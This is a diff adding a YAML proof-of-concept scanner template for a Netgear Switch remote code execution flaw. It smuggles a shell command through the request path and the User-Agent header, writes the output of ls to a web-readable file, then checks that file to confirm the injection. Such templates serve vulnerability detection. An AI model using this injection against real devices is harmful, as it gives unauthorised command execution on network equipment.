@@ -1,0 +1,26 @@
+id: poc-yaml-netgear-switch-rce
+info:
+  name: Netgear Switch 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Netgear
+  osprey-id: vb_2021_0055
+variables:
+  r_rand_str: random_str(8)
+requests:
+- method: GET
+  path: /cgi/setup.cgi';$HTTP_USER_AGENT;'
+  headers:
+    User-Agent: sh -c ls>/webtmp/{{.r_rand_str}}.js
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /tmp/{{.r_rand_str}}.js
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "httpservercert.cgi") && contains(body,
+    "httpuploadbakcfg.cgi")
+
+    '
+transport: http
